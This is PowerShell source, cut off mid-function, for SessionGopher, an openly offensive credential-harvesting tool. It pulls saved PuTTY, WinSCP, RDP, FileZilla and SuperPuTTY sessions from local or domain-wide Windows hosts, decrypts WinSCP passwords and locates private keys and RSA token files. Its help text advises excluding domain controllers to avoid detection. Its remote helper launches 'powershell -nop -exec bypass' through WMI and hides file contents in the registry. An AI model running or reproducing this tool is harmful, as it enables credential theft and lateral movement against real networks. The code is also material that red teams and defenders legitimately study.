function Invoke-SessionGopher 
{
<#
.SYNPOSIS
Extracts and decrypts saved session information for software typically used to access Unix systems.

.DESCRIPTION
Queries HKEY_USERS for PuTTY, WinSCP, and Remote Desktop saved sessions. Decrypts saved passwords for WinSCP.
Extracts FileZilla, SuperPuTTY's saved session information in the sitemanager.xml file and decodes saved passwords.
In Thorough mode, identifies PuTTY private key (.ppk), Remote Desktop Connection (.rdp), and RSA token (.sdtid) files, and extracts private key and session information.
Can be run remotely using the -InputList (supply input list of computers) or -AllDomain (run against all AD-joined computers) flags.
Must either provide credentials (-username and -password) of an admin on target boxes, or run script in the context of
a privileged user on the target boxes, in which case no credentials are needed.

.PARAMETER username
Domain\username to use for a remote target.

.PARAMETER pass
Password to use for a remote target.

.PARAMETER Target
Target machine.

.PARAMETER InputList
A newline separated list of target machines.

.PARAMETER AllDomain
Queries Active Direcotry for a list of all domain-joined computers and runs SessionGopher against all of them.

.PARAMETER Thorough
Searches entire filesystem for certain file extensions.

.PARAMETER ExcludeDC
Exclude the Domain Controllers from the target list when using the AllDomain option to avoid detection.

.PARAMETER OutCSV
Generates CSV output.

.PARAMETER OutputDirectory
The output directory for CSV. Default is SessionGopher with time stamp in the current working directory,

.EXAMPLE
PS > Invoke-SessionGopher -Verbose

Gather information from the local box.

.EXAMPLE
PS > Invoke-SessionGopher –ComputerName 192.168.11.2 –Credential mydomain\adminuser

Gather information from the the target box - administator rights are required on the target box.

.EXAMPLE
PS > Invoke-SessionGopher –Credential mydomain\adminuser -AllDomain -Verbose

Gather information from all the member computers of the current domain of the machine where the script is executed. 
Use -ExcludeDC option for stealth and avoid detection. 

.EXAMPLE
PS > Invoke-SessionGopher –Credential mydomain\adminuser -Thorough -Verbose

Gather information from registry and filesystem of the target computer. 


.Notes
Author: Brandon Arvanaghi
Date: February 17, 2017
Thanks: 
Brice Daniels, Pan Chan - collaborating on idea
Christopher Truncer - helping with WMI
Minor modifications related to usability for including the script in Nishang

.LINK
https://github.com/Arvanaghi/SessionGopher-Arvanaghi
https://github.com/samratashok/nishang
 
#>

    [CmdletBinding()] Param (
        [Parameter(Position = 0, Mandatory = $False)]
        [String]
        $Computername,

        [Parameter(Position= 1 , Mandatory = $False)]
        [String]
        $Credential,

        [Parameter(Position= 2 , Mandatory = $False)]
        [Alias("iL")]
        [String]
        $Inputlist,
        
        [Parameter(Position = 3, Mandatory = $False)]
        [Switch]
        $AllDomain,
        
        [Parameter(Position = 4, Mandatory = $False)]
        [Switch]
        $Thorough,

        [Parameter(Position = 5, Mandatory = $False)]
        [Switch]
        $ExcludeDC,
                
        [Parameter(Position = 6, Mandatory = $False)]
        [Switch]
        [Alias("o")]
        $OutCSV,

        [Parameter(Position=8, Mandatory = $False)]
        [String]
        $OutputDirectory = "$pwd\SessionGopher-" + (Get-Date -Format o | foreach {$_ -replace ":", "."})
    )

  Write-Output '
          o_       
         /  ".   SessionGopher
       ,"  _-"      
     ,"   m m         
  ..+     )      Brandon Arvanaghi
     `m..m       @arvanaghi | arvanaghi.com
  '
  $ErrorActionPreference = "SilentlyContinue"
  #clear error listing
  $Error.clear()
  if ($OutCSV) {
    Write-Verbose "Creating directory $OutputDirectory."
    New-Item -ItemType Directory $OutputDirectory | Out-Null
    New-Item ($OutputDirectory + "\PuTTY.csv") -Type File | Out-Null
    New-Item ($OutputDirectory + "\SuperPuTTY.csv") -Type File | Out-Null
    New-Item ($OutputDirectory + "\WinSCP.csv") -Type File | Out-Null
    New-Item ($OutputDirectory + "\FileZilla.csv") -Type File | Out-Null
    New-Item ($OutputDirectory + "\RDP.csv") -Type File | Out-Null
    if ($Thorough) {
        New-Item ($OutputDirectory + "\PuTTY ppk Files.csv") -Type File | Out-Null
        New-Item ($OutputDirectory + "\Microsoft rdp Files.csv") -Type File | Out-Null
        New-Item ($OutputDirectory + "\RSA sdtid Files.csv") -Type File | Out-Null
    }
  }

  if ($Credential) {
    $Credentials = Get-Credential -Credential $Credential
  }

  # Value for HKEY_USERS hive
  $HKU = 2147483651
  # Value for HKEY_LOCAL_MACHINE hive
  $HKLM = 2147483650

  $PuTTYPathEnding = "\SOFTWARE\SimonTatham\PuTTY\Sessions"
  $WinSCPPathEnding = "\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions"
  $RDPPathEnding = "\SOFTWARE\Microsoft\Terminal Server Client\Servers"

  if ($Inputlist -or $AllDomain -or $ComputerName) {

    # Whether we read from an input file or query active directory
    $Reader = ""

    if ($AllDomain) {
      Write-Verbose "Getting member computers in the domain."
      $Reader = GetComputersFromActiveDirectory   
    } elseif ($Inputlist) { 
      Write-Verbose "Reading the list of targets."
      $Reader = Get-Content ((Resolve-Path $Inputlist).Path)
    } elseif ($ComputerName) {
      Write-Verbose "Setting target computer as $ComputerName."
      $Reader = $ComputerName
    }

    $optionalCreds = @{}
    if ($Credentials) {
      $optionalCreds['Credential'] = $Credentials
    }

    foreach ($RemoteComputer in $Reader) {

      if ($AllDomain) {
        # Extract just the name from the System.DirectoryServices.SearchResult object
        $RemoteComputer = $RemoteComputer.Properties.name
      }
       if ($RemoteComputer) {
      Write-Output "Digging on" $RemoteComputer"..."

      $SIDS = Invoke-WmiMethod -Class 'StdRegProv' -Name 'EnumKey' -ArgumentList $HKU,'' -ComputerName $RemoteComputer @optionalCreds | Select-Object -ExpandProperty sNames | Where-Object {$_ -match 'S-1-5-21-[\d\-]+$'}

      foreach ($SID in $SIDs) {

        # Get the username for SID we discovered has saved sessions
        $MappedUserName = try { (Split-Path -Leaf (Split-Path -Leaf (GetMappedSID))) } catch {}
        $Source = (($RemoteComputer + "\" + $MappedUserName) -Join "")

        # Created for each user found. Contains all sessions information for that user. 
        $UserObject = New-Object PSObject

        <#
        PuTTY: contains hostname and usernames
        SuperPuTTY: contains username, hostname, relevant protocol information, decrypted passwords if stored
        RDP: contains hostname and username of sessions
        FileZilla: hostname, username, relevant protocol information, decoded passwords if stored
        WinSCP: contains hostname, username, protocol, deobfuscated password if stored and no master password used
        #>
        $ArrayOfPuTTYSessions = New-Object System.Collections.ArrayList
        $ArrayOfSuperPuTTYSessions = New-Object System.Collections.ArrayList
        $ArrayOfRDPSessions = New-Object System.Collections.ArrayList
        $ArrayOfFileZillaSessions = New-Object System.Collections.ArrayList
        $ArrayOfWinSCPSessions = New-Object System.Collections.ArrayList

        # Construct tool registry/filesystem paths from SID or username
        $RDPPath = $SID + $RDPPathEnding
        $PuTTYPath = $SID + $PuTTYPathEnding
        $WinSCPPath = $SID + $WinSCPPathEnding
        $SuperPuTTYFilter = "Drive='C:' AND Path='\\Users\\$MappedUserName\\Documents\\SuperPuTTY\\' AND FileName='Sessions' AND Extension='XML'"
        $FileZillaFilter = "Drive='C:' AND Path='\\Users\\$MappedUserName\\AppData\\Roaming\\FileZilla\\' AND FileName='sitemanager' AND Extension='XML'"

        $RDPSessions = Invoke-WmiMethod -ComputerName $RemoteComputer -Class 'StdRegProv' -Name EnumKey -ArgumentList $HKU,$RDPPath @optionalCreds
        $PuTTYSessions = Invoke-WmiMethod -ComputerName $RemoteComputer -Class 'StdRegProv' -Name EnumKey -ArgumentList $HKU,$PuTTYPath @optionalCreds
        $WinSCPSessions = Invoke-WmiMethod -ComputerName $RemoteComputer -Class 'StdRegProv' -Name EnumKey -ArgumentList $HKU,$WinSCPPath @optionalCreds
        $SuperPuTTYPath = (Get-WmiObject -Class 'CIM_DataFile' -Filter $SuperPuTTYFilter -ComputerName $RemoteComputer @optionalCreds | Select Name)
        $FileZillaPath = (Get-WmiObject -Class 'CIM_DataFile' -Filter $FileZillaFilter -ComputerName $RemoteComputer @optionalCreds | Select Name)

        # If any WinSCP saved sessions exist on this box...
        if (($WinSCPSessions | Select-Object -ExpandPropert ReturnValue) -eq 0) {
          Write-Verbose "Found saved WinSCP sessions."
          # Get all sessions
          $WinSCPSessions = $WinSCPSessions | Select-Object -ExpandProperty sNames
          
          foreach ($WinSCPSession in $WinSCPSessions) {
      
            $WinSCPSessionObject = "" | Select-Object -Property Source,Session,Hostname,Username,Password
            $WinSCPSessionObject.Source = $Source
            $WinSCPSessionObject.Session = $WinSCPSession

            $Location = $WinSCPPath + "\" + $WinSCPSession

            $WinSCPSessionObject.Hostname = (Invoke-WmiMethod -ComputerName $RemoteComputer -Class 'StdRegProv' -Name GetStringValue -ArgumentList $HKU,$Location,"HostName" @optionalCreds).sValue
            $WinSCPSessionObject.Username = (Invoke-WmiMethod -ComputerName $RemoteComputer -Class 'StdRegProv' -Name GetStringValue -ArgumentList $HKU,$Location,"UserName" @optionalCreds).sValue
            $WinSCPSessionObject.Password = (Invoke-WmiMethod -ComputerName $RemoteComputer -Class 'StdRegProv' -Name GetStringValue -ArgumentList $HKU,$Location,"Password" @optionalCreds).sValue

            if ($WinSCPSessionObject.Password) {

              $MasterPassPath = $SID + "\Software\Martin Prikryl\WinSCP 2\Configuration\Security"
          
              $MasterPassUsed = (Invoke-WmiMethod -ComputerName $RemoteComputer -Class 'StdRegProv' -Name GetDWordValue -ArgumentList $HKU,$MasterPassPath,"UseMasterPassword" @optionalCreds).uValue
              
              if (!$MasterPassUsed) {
                  $WinSCPSessionObject.Password = (DecryptWinSCPPassword $WinSCPSessionObject.Hostname $WinSCPSessionObject.Username $WinSCPSessionObject.Password)
              } else {
                  $WinSCPSessionObject.Password = "Saved in session, but master password prevents plaintext recovery"
              }

            }
             
            [void]$ArrayOfWinSCPSessions.Add($WinSCPSessionObject)
      
          } # For Each WinSCP Session

          if ($ArrayOfWinSCPSessions.count -gt 0) {

            $UserObject | Add-Member -MemberType NoteProperty -Name "WinSCP Sessions" -Value $ArrayOfWinSCPSessions

            if ($OutCSV) {
              $ArrayOfWinSCPSessions | Select-Object * | Export-CSV -Append -Path ($OutputDirectory + "\WinSCP.csv") -NoTypeInformation
            } else {
              Write-Output "WinSCP Sessions"
              $ArrayOfWinSCPSessions | Select-Object * | Format-List | Out-String
            }

          }
        
        } # If path to WinSCP exists

        if (($PuTTYSessions | Select-Object -ExpandPropert ReturnValue) -eq 0) {
          Write-Verbose "Found saved PuTTY sessions."
          # Get all sessions
          $PuTTYSessions = $PuTTYSessions | Select-Object -ExpandProperty sNames

          foreach ($PuTTYSession in $PuTTYSessions) {
      
            $PuTTYSessionObject = "" | Select-Object -Property Source,Session,Hostname

            $Location = $PuTTYPath + "\" + $PuTTYSession

            $PuTTYSessionObject.Source = $Source
            $PuTTYSessionObject.Session = $PuTTYSession
            $PuTTYSessionObject.Hostname = (Invoke-WmiMethod -ComputerName $RemoteComputer -Class 'StdRegProv' -Name GetStringValue -ArgumentList $HKU,$Location,"HostName" @optionalCreds).sValue
             
            [void]$ArrayOfPuTTYSessions.Add($PuTTYSessionObject)
      
          }

          if ($ArrayOfPuTTYSessions.count -gt 0) {

            $UserObject | Add-Member -MemberType NoteProperty -Name "PuTTY Sessions" -Value $ArrayOfPuTTYSessions

            if ($OutCSV) {
              $ArrayOfPuTTYSessions | Select-Object * | Export-CSV -Append -Path ($OutputDirectory + "\PuTTY.csv") -NoTypeInformation
            } else {
              Write-Output "PuTTY Sessions"
              $ArrayOfPuTTYSessions | Select-Object * | Format-List | Out-String
            }

          }

        } # If PuTTY session exists

        if (($RDPSessions | Select-Object -ExpandPropert ReturnValue) -eq 0) {
          Write-Verbose "Found saved RDP sessions."
          # Get all sessions
          $RDPSessions = $RDPSessions | Select-Object -ExpandProperty sNames

          foreach ($RDPSession in $RDPSessions) {
      
            $RDPSessionObject = "" | Select-Object -Property Source,Hostname,Username
            
            $Location = $RDPPath + "\" + $RDPSession

            $RDPSessionObject.Source = $Source
            $RDPSessionObject.Hostname = $RDPSession
            $RDPSessionObject.Username = (Invoke-WmiMethod -ComputerName $RemoteComputer -Class 'StdRegProv' -Name GetStringValue -ArgumentList $HKU,$Location,"UserNameHint" @optionalCreds).sValue

            [void]$ArrayOfRDPSessions.Add($RDPSessionObject)
      
          }

          if ($ArrayOfRDPSessions.count -gt 0) {

            $UserObject | Add-Member -MemberType NoteProperty -Name "RDP Sessions" -Value $ArrayOfRDPSessions

            if ($OutCSV) {
              $ArrayOfRDPSessions | Select-Object * | Export-CSV -Append -Path ($OutputDirectory + "\RDP.csv") -NoTypeInformation
            } else {
              Write-Output "Microsoft RDP Sessions"
              $ArrayOfRDPSessions | Select-Object * | Format-List | Out-String
            }

          }

        } # If RDP sessions exist

        # If we find the SuperPuTTY Sessions.xml file where we would expect it
        if ($SuperPuTTYPath.Name) {
          Write-Verbose "Found SupePuTTY sessions.xml"
          $File = "C:\Users\$MappedUserName\Documents\SuperPuTTY\Sessions.xml"
          $FileContents = DownloadAndExtractFromRemoteRegistry $File

          [xml]$SuperPuTTYXML = $FileContents
          (ProcessSuperPuTTYFile $SuperPuTTYXML)

        }

        # If we find the FileZilla sitemanager.xml file where we would expect it
        if ($FileZillaPath.Name) {
          Write-Verbose "Found FileZilaa sitemanager.xml"
          $File = "C:\Users\$MappedUserName\AppData\Roaming\FileZilla\sitemanager.xml"
          $FileContents = DownloadAndExtractFromRemoteRegistry $File

          [xml]$FileZillaXML = $FileContents
          (ProcessFileZillaFile $FileZillaXML)

        } # FileZilla

      } # for each SID

      if ($Thorough) {
        Write-Verbose "Running the Thorough tests. Reading files on the target machine. This may take few minutes."
        $ArrayofPPKFiles = New-Object System.Collections.ArrayList
        $ArrayofRDPFiles = New-Object System.Collections.ArrayList
        $ArrayofsdtidFiles = New-Object System.Collections.ArrayList

        $FilePathsFound = (Get-WmiObject -Class 'CIM_DataFile' -Filter "Drive='C:' AND extension='ppk' OR extension='rdp' OR extension='.sdtid'" -ComputerName $RemoteComputer @optionalCreds | Select Name)

        (ProcessThoroughRemote $FilePathsFound)
        
      } 
      
    
    # Check if the error is access denied.
    $ourerror = $error[0]
    if ($ourerror.Exception.Message.Contains("Access is denied.")) {
	  Write-Warning "Access Denied on $RemoteComputer"
	} elseif ($ourerror.Exception.Message.Contains("The RPC server is unavailable.")) {
	  Write-Warning "Cannot connect to $RemoteComputer. Is the host up and accepting RPC connections?"
	} else {
	  Write-Debug "$($ourerror.Exception.Message)"
	}
    }
    }# for each remote computer
  # Else, we run SessionGopher locally
  } else { 
    
    Write-Output "Digging on"(Hostname)"..."

    # Aggregate all user hives in HKEY_USERS into a variable
    $UserHives = Get-ChildItem Registry::HKEY_USERS\ -ErrorAction SilentlyContinue | Where-Object {$_.Name -match '^HKEY_USERS\\S-1-5-21-[\d\-]+$'}

    # For each SID beginning in S-15-21-. Loops through each user hive in HKEY_USERS.
    foreach($Hive in $UserHives) {

      # Created for each user found. Contains all PuTTY, WinSCP, FileZilla, RDP information. 
      $UserObject = New-Object PSObject

      $ArrayOfWinSCPSessions = New-Object System.Collections.ArrayList
      $ArrayOfPuTTYSessions = New-Object System.Collections.ArrayList
      $ArrayOfPPKFiles = New-Object System.Collections.ArrayList
      $ArrayOfSuperPuTTYSessions = New-Object System.Collections.ArrayList
      $ArrayOfRDPSessions = New-Object System.Collections.ArrayList
      $ArrayOfRDPFiles = New-Object System.Collections.ArrayList
      $ArrayOfFileZillaSessions = New-Object System.Collections.ArrayList

      $objUser = (GetMappedSID)
      $Source = (Hostname) + "\" + (Split-Path $objUser.Value -Leaf)

      $UserObject | Add-Member -MemberType NoteProperty -Name "Source" -Value $objUser.Value

      # Construct PuTTY, WinSCP, RDP, FileZilla session paths from base key
      $PuTTYPath = Join-Path $Hive.PSPath "\$PuTTYPathEnding"
      $WinSCPPath = Join-Path $Hive.PSPath "\$WinSCPPathEnding"
      $MicrosoftRDPPath = Join-Path $Hive.PSPath "\$RDPPathEnding"
      $FileZillaPath = "C:\Users\" + (Split-Path -Leaf $UserObject."Source") + "\AppData\Roaming\FileZilla\sitemanager.xml"
      $SuperPuTTYPath = "C:\Users\" + (Split-Path -Leaf $UserObject."Source") + "\Documents\SuperPuTTY\Sessions.xml"

      if (Test-Path $FileZillaPath) {

        [xml]$FileZillaXML = Get-Content $FileZillaPath
        (ProcessFileZillaFile $FileZillaXML)

      }

      if (Test-Path $SuperPuTTYPath) {

        [xml]$SuperPuTTYXML = Get-Content $SuperPuTTYPath
        (ProcessSuperPuTTYFile $SuperPuTTYXML)

      }

      if (Test-Path $MicrosoftRDPPath) {

        # Aggregates all saved sessions from that user's RDP client
        $AllRDPSessions = Get-ChildItem $MicrosoftRDPPath

        (ProcessRDPLocal $AllRDPSessions)

      } # If (Test-Path MicrosoftRDPPath)

      if (Test-Path $WinSCPPath) {

        # Aggregates all saved sessions from that user's WinSCP client
        $AllWinSCPSessions = Get-ChildItem $WinSCPPath

        (ProcessWinSCPLocal $AllWinSCPSessions)

      } # If (Test-Path WinSCPPath)
      
      if (Test-Path $PuTTYPath) {

        # Aggregates all saved sessions from that user's PuTTY client
        $AllPuTTYSessions = Get-ChildItem $PuTTYPath

        (ProcessPuTTYLocal $AllPuTTYSessions)

      } # If (Test-Path PuTTYPath)

    } # For each Hive in UserHives

    # If run in Thorough Mode
    if ($Thorough) {

      # Contains raw i-node data for files with extension .ppk, .rdp, and sdtid respectively, found by Get-ChildItem
      $PPKExtensionFilesINodes = New-Object System.Collections.ArrayList
      $RDPExtensionFilesINodes = New-Object System.Collections.ArrayList
      $sdtidExtensionFilesINodes = New-Object System.Collections.ArrayList

      # All drives found on system in one variable
      $AllDrives = Get-PSDrive

      (ProcessThoroughLocal $AllDrives)
      
      (ProcessPPKFile $PPKExtensionFilesINodes)
      (ProcessRDPFile $RDPExtensionFilesINodes)
      (ProcesssdtidFile $sdtidExtensionFilesINodes)

    } # If Thorough

  } # Else -- run SessionGopher locally

} # Invoke-SessionGopher

####################################################################################
####################################################################################
## Registry Querying Helper Functions
####################################################################################
####################################################################################

# Maps the SID from HKEY_USERS to a username through the HKEY_LOCAL_MACHINE hive
function GetMappedSID {

  # If getting SID from remote computer
  if ($Inputlist -or $ComputerName -or $AllDomain) {
    # Get the username for SID we discovered has saved sessions
    $SIDPath = "SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\$SID"
    $Value = "ProfileImagePath"

    (Invoke-WmiMethod -ComputerName $RemoteComputer -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $HKLM,$SIDPath,$Value @optionalCreds).sValue
  # Else, get local SIDs
  } else {
    # Converts user SID in HKEY_USERS to username
    $SID = (Split-Path $Hive.Name -Leaf)
    $objSID = New-Object System.Security.Principal.SecurityIdentifier("$SID")
    $objSID.Translate( [System.Security.Principal.NTAccount])
  }

}

function DownloadAndExtractFromRemoteRegistry($File) {
  # The following code is taken from Christopher Truncer's WMIOps script on GitHub. It gets file contents through WMI by
  # downloading the file's contents to the remote computer's registry, and then extracting the value from that registry location
  $fullregistrypath = "HKLM:\Software\Microsoft\DRM"
  $registrydownname = "ReadMe"
  $regpath = "SOFTWARE\Microsoft\DRM"
          
  # On remote system, save file to registry
  Write-Verbose "Reading remote file and writing on remote registry"
  $remote_command = '$fct = Get-Content -Encoding byte -Path ''' + "$File" + '''; $fctenc = [System.Convert]::ToBase64String($fct); New-ItemProperty -Path ' + "'$fullregistrypath'" + ' -Name ' + "'$registrydownname'" + ' -Value $fctenc -PropertyType String -Force'
  $remote_command = 'powershell -nop -exec bypass -c "' + $remote_command + '"'

  $null = Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $remote_command -ComputerName $RemoteComputer @optionalCreds

  # Sleeping to let remote system read and store file
  Start-Sleep -s 15

  $remote_reg = ""

  # Grab file from remote system's registry
  $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $HKLM, $regpath, $registrydownname -Computer $RemoteComputer @optionalCreds
  
  $decoded = [System.Convert]::FromBase64String($remote_reg.sValue)
  $UTF8decoded = [System.Text.Encoding]::UTF8.GetString($decoded) 
    
  # Removing Registry value from remote system
  $null = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -ComputerName $RemoteComputer @optionalCreds
  
   $UTF8decoded

}

####################################################################################
####################################################################################
## File Processing Helper Functions
####################################################################################
####################################################################################

function ProcessThoroughLocal($AllDrives) {
  
  foreach ($Drive in $AllDrives) {
    # If the drive holds a filesystem
    if ($Drive.Provider.Name -eq "FileSystem") {
      $Dirs = Get-ChildItem $Drive.Root -Recurse -ErrorAction SilentlyContinue
      foreach ($Dir in $Dirs) {
        Switch ($Dir.Extension) {
          ".ppk" {[void]$PPKExtensionFilesINodes.Add($Dir)}
          ".rdp" {[void]$RDPExtensionFilesINodes.Add($Dir)}
          ".sdtid" {[void]$sdtidExtensionFilesINodes.Add($Dir)}
        }
      }
    }
  }

}

function ProcessThoroughRemote($FilePathsFound) {

  foreach ($FilePath in $FilePathsFound) {
      # Each object we create for the file extension found from a -Thorough search will have the same properties (Source, Path to File)
      $ThoroughObject = "" | Select-Object -Property Source,Path
      $ThoroughObject.Source = $RemoteComputer

      $Extension = [IO.Path]::GetExtension($FilePath.Name)

      if ($Extension -eq ".ppk") {
        $ThoroughObject.Path = $FilePath.Name
        [void]$ArrayofPPKFiles.Add($ThoroughObject)
      } elseif ($Extension -eq ".rdp") {
        $ThoroughObject.Path = $FilePath.Name
        [void]$ArrayofRDPFiles.Add($ThoroughObject)
      } elseif ($Extension -eq ".sdtid") {
        $ThoroughObject.Path = $FilePath.Name
        [void]$ArrayofsdtidFiles.Add($ThoroughObject)
      }

  }

  if ($ArrayOfPPKFiles.count -gt 0) {

    $UserObject | Add-Member -MemberType NoteProperty -Name "PPK Files" -Value $ArrayOfRDPFiles

    if ($OutCSV) {
      $ArrayOfPPKFiles | Export-CSV -Append -Path ($OutputDirectory + "\PuTTY ppk Files.csv") -NoTypeInformation
    } else {
      Write-Output "PuTTY Private Key Files (.ppk)"
      $ArrayOfPPKFiles | Format-List | Out-String
    }
  }

  if ($ArrayOfRDPFiles.count -gt 0) {

    $UserObject | Add-Member -MemberType NoteProperty -Name "RDP Files" -Value $ArrayOfRDPFiles

    if ($OutCSV) {
      $ArrayOfRDPFiles | Export-CSV -Append -Path ($OutputDirectory + "\Microsoft rdp Files.csv") -NoTypeInformation
    } else {
      Write-Output "Microsoft RDP Connection Files (.rdp)"
      $ArrayOfRDPFiles | Format-List | Out-String
    }
  }
  if ($ArrayOfsdtidFiles.count -gt 0) {

    $UserObject | Add-Member -MemberType NoteProperty -Name "sdtid Files" -Value $ArrayOfsdtidFiles

    if ($OutCSV) {
      $ArrayOfsdtidFiles | Export-CSV -Append -Path ($OutputDirectory + "\RSA sdtid Files.csv") -NoTypeInformation
    } else {
      Write-Output "RSA Tokens (sdtid)"
      $ArrayOfsdtidFiles | Format-List | Out-String
    }

  }

} # ProcessThoroughRemote

function ProcessPuTTYLocal($AllPuTTYSessions) {
  
  # For each PuTTY saved session, extract the information we want 
  foreach($Session in $AllPuTTYSessions) {

    $PuTTYSessionObject = "" | Select-Object -Property Source,Session,Hostname

    $PuTTYSessionObject.Source = $Source
    $PuTTYSessionObject.Session = (Split-Path $Session -Leaf)
    $PuTTYSessionObject.Hostname = ((Get-ItemProperty -Path ("Microsoft.PowerShell.Core\Registry::" + $Session) -Name "Hostname" -ErrorAction SilentlyContinue).Hostname)

    # ArrayList.Add() by default prints the index to which it adds the element. Casting to [void] silences this.
    [void]$ArrayOfPuTTYSessions.Add($PuTTYSessionObject)

  }

  if ($OutCSV) {
    $ArrayOfPuTTYSessions | Export-CSV -Append -Path ($OutputDirectory + "\PuTTY.csv") -NoTypeInformation
  } else {
    Write-Output "PuTTY Sessions"
    $ArrayOfPuTTYSessions | Format-List | Out-String
  }

  # Add the array of PuTTY session objects to UserObject
  $UserObject | Add-Member -MemberType NoteProperty -Name "PuTTY Sessions" -Value $ArrayOfPuTTYSessions

} # ProcessPuTTYLocal

function ProcessRDPLocal($AllRDPSessions) {

  # For each RDP saved session, extract the information we want
  foreach($Session in $AllRDPSessions) {

    $PathToRDPSession = "Microsoft.PowerShell.Core\Registry::" + $Session

    $MicrosoftRDPSessionObject = "" | Select-Object -Property Source,Hostname,Username

    $MicrosoftRDPSessionObject.Source = $Source
    $MicrosoftRDPSessionObject.Hostname = (Split-Path $Session -Leaf)
    $MicrosoftRDPSessionObject.Username = ((Get-ItemProperty -Path $PathToRDPSession -Name "UsernameHint" -ErrorAction SilentlyContinue).UsernameHint)

    # ArrayList.Add() by default prints the index to which it adds the element. Casting to [void] silences this.
    [void]$ArrayOfRDPSessions.Add($MicrosoftRDPSessionObject)

  } # For each Session in AllRDPSessions

  if ($OutCSV) {
    $ArrayOfRDPSessions | Export-CSV -Append -Path ($OutputDirectory + "\RDP.csv") -NoTypeInformation
  } else {
    Write-Output "Microsoft Remote Desktop (RDP) Sessions"
    $ArrayOfRDPSessions | Format-List | Out-String
  }

  # Add the array of RDP session objects to UserObject
  $UserObject | Add-Member -MemberType NoteProperty -Name "RDP Sessions" -Value $ArrayOfRDPSessions

} #ProcessRDPLocal

function ProcessWinSCPLocal($AllWinSCPSessions) {
  
  # For each WinSCP saved session, extract the information we want
  foreach($Session in $AllWinSCPSessions) {

    $PathToWinSCPSession = "Microsoft.PowerShell.Core\Registry::" + $Session

    $WinSCPSessionObject = "" | Select-Object -Property Source,Session,Hostname,Username,Password

    $WinSCPSessionObject.Source = $Source
    $WinSCPSessionObject.Session = (Split-Path $Session -Leaf)
    $WinSCPSessionObject.Hostname = ((Get-ItemProperty -Path $PathToWinSCPSession -Name "Hostname" -ErrorAction SilentlyContinue).Hostname)
    $WinSCPSessionObject.Username = ((Get-ItemProperty -Path $PathToWinSCPSession -Name "Username" -ErrorAction SilentlyContinue).Username)
    $WinSCPSessionObject.Password = ((Get-ItemProperty -Path $PathToWinSCPSession -Name "Password" -ErrorAction SilentlyContinue).Password)

    if ($WinSCPSessionObject.Password) {
      $MasterPassUsed = ((Get-ItemProperty -Path (Join-Path $Hive.PSPath "SOFTWARE\Martin Prikryl\WinSCP 2\Configuration\Security") -Name "UseMasterPassword" -ErrorAction SilentlyContinue).UseMasterPassword)

      # If the user is not using a master password, we can crack it:
      if (!$MasterPassUsed) {
          $WinSCPSessionObject.Password = (DecryptWinSCPPassword $WinSCPSessionObject.Hostname $WinSCPSessionObject.Username $WinSCPSessionObject.Password)
      # Else, the user is using a master password. We can't retrieve plaintext credentials for it.
      } else {
          $WinSCPSessionObject.Password = "Saved in session, but master password prevents plaintext recovery"
      }
    }

    # ArrayList.Add() by default prints the index to which it adds the element. Casting to [void] silences this.
    [void]$ArrayOfWinSCPSessions.Add($WinSCPSessionObject)

  } # For each Session in AllWinSCPSessions

  if ($OutCSV) {
    $ArrayOfWinSCPSessions | Export-CSV -Append -Path ($OutputDirectory + "\WinSCP.csv") -NoTypeInformation
  } else {
    Write-Output "WinSCP Sessions"
    $ArrayOfWinSCPSessions | Format-List | Out-String
  }

  # Add the array of WinSCP session objects to the target user object
  $UserObject | Add-Member -MemberType NoteProperty -Name "WinSCP Sessions" -Value $ArrayOfWinSCPSessions

} # ProcessWinSCPLocal

function ProcesssdtidFile($sdtidExtensionFilesINodes) {

  foreach ($Path in $sdtidExtensionFilesINodes.VersionInfo.FileName) {

    $sdtidFileObject = "" | Select-Object -Property "Source","Path"

    $sdtidFileObject."Source" = $Source
    $sdtidFileObject."Path" = $Path

    [void]$ArrayOfsdtidFiles.Add($sdtidFileObject)

  }

  if ($ArrayOfsdtidFiles.count -gt 0) {

    $UserObject | Add-Member -MemberType NoteProperty -Name "sdtid Files" -Value $ArrayOfsdtidFiles

    if ($OutCSV) {
      $ArrayOfsdtidFiles | Select-Object * | Export-CSV -Append -Path ($OutputDirectory + "\RSA sdtid Files.csv") -NoTypeInformation
    } else {
      Write-Output "RSA Tokens (sdtid)"
      $ArrayOfsdtidFiles | Select-Object * | Format-List | Out-String
    }

  }

} # Process sdtid File

function ProcessRDPFile($RDPExtensionFilesINodes) {
  
  # Extracting the filepath from the i-node information stored in RDPExtensionFilesINodes
  foreach ($Path in $RDPExtensionFilesINodes.VersionInfo.FileName) {
    
    $RDPFileObject = "" | Select-Object -Property "Source","Path","Hostname","Gateway","Prompts for Credentials","Administrative Session"

    $RDPFileObject."Source" = (Hostname)

    # The next several lines use regex pattern matching to store relevant info from the .rdp file into our object
    $RDPFileObject."Path" = $Path 
    $RDPFileObject."Hostname" = try { (Select-String -Path $Path -Pattern "full address:[a-z]:(.*)").Matches.Groups[1].Value } catch {}
    $RDPFileObject."Gateway" = try { (Select-String -Path $Path -Pattern "gatewayhostname:[a-z]:(.*)").Matches.Groups[1].Value } catch {}
    $RDPFileObject."Administrative Session" = try { (Select-String -Path $Path -Pattern "administrative session:[a-z]:(.*)").Matches.Groups[1].Value } catch {}
    $RDPFileObject."Prompts for Credentials" = try { (Select-String -Path $Path -Pattern "prompt for credentials:[a-z]:(.*)").Matches.Groups[1].Value } catch {}

    if (!$RDPFileObject."Administrative Session" -or !$RDPFileObject."Administrative Session" -eq 0) {
      $RDPFileObject."Administrative Session" = "Does not connect to admin session on remote host"
    } else {
      $RDPFileObject."Administrative Session" = "Connects to admin session on remote host"
    }
    if (!$RDPFileObject."Prompts for Credentials" -or $RDPFileObject."Prompts for Credentials" -eq 0) {
      $RDPFileObject."Prompts for Credentials" = "No"
    } else {
      $RDPFileObject."Prompts for Credentials" = "Yes"
    }

    [void]$ArrayOfRDPFiles.Add($RDPFileObject)

  }

  if ($ArrayOfRDPFiles.count -gt 0) {

    $UserObject | Add-Member -MemberType NoteProperty -Name "RDP Files" -Value $ArrayOfRDPFiles

    if ($OutCSV) {
      $ArrayOfRDPFiles | Select-Object * | Export-CSV -Append -Path ($OutputDirectory + "\Microsoft rdp Files.csv") -NoTypeInformation
    } else {
